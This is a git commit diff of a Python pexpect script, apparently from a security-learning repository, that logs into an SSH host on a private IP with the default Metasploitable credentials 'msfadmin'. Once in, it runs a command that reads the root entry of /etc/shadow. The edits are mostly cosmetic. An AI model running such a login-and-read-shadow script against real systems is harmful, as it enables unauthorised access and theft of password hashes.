1cd1595445bc544ea74d6a55a6238db45b636d42
Deepak <nagarkotideepak9843@gmail.com>
2022-07-28 12:52:42 -0400

    sshlogin added

--- 02-SSH-FTP/sshlogin.py
+++ 02-SSH-FTP/sshlogin.py
@@ -1,35 +1,36 @@
 #!usr/bin/python
 import pexpect
 
-PROMPT = ["#", ">>>", ">" ,"\$"]
+PROMPT = ['#', '>>>', '>' ,'\$']
 
 def send_command(child,command):
     child.sendline(command)
     child.expect(PROMPT)
     print(child.before)
 
-def connect(user, hostkeyal, host, password):
-    ssh_newkey = "Are you sure, you want to continue connecting? "
-    connStr = "sudo " + "ssh " + hostkeyal + user + "@" + host
+def connect(hostkeyal, user, host, password):
+    ssh_newkey = 'Are you sure, you want to continue connecting?'
+    connStr = 'ssh'  + hostkeyal + user + '@' + host
     child = pexpect.spawn(connStr)
-    ret = child.expect([pexpect.TIMEOUT, ssh_newkey, "[P|p]assword: "])
+    ret = child.expect([pexpect.TIMEOUT, ssh_newkey, '[P|p]assword:'])
     if ret == 0:
-        print("[-] Error Connecting!!!")
+        print('[-] Error Connecting!!!')
         return
     if ret == 1:
         child.sendline("yes")
-        ret = child.expect([pexpect.TIMEOUT, "[P|p]assword: "])
+        ret = child.expect([pexpect.TIMEOUT, '[P|p]assword: '])
         if ret == 0:
-            print("[-] Error Connecting!!!")
+            print('[-] Error Connecting!!!')
     child.sendline(password)
     child.expect(PROMPT)
     return child
 
 def main():
-    host = "172.28.209.136"
-    user = "msfadmin"
-    hostkeyal = " -oHostKeyAlgorithms=+ssh-dss "
-    password = "msfadmin"
-    child = connect(user,hostkeyal,host,password)
-    send_command(child, "cat /etc/shadow | grep root;ps")
+    host = '192.168.1.75'
+    user = 'msfadmin'
+    hostkeyal = ' -oHostKeyAlgorithms=+ssh-dss '
+    password = 'msfadmin'
+    child = connect(hostkeyal,user,host,password)
+    send_command(child, 'cat /etc/shadow | grep root;ps')
+    
 main()
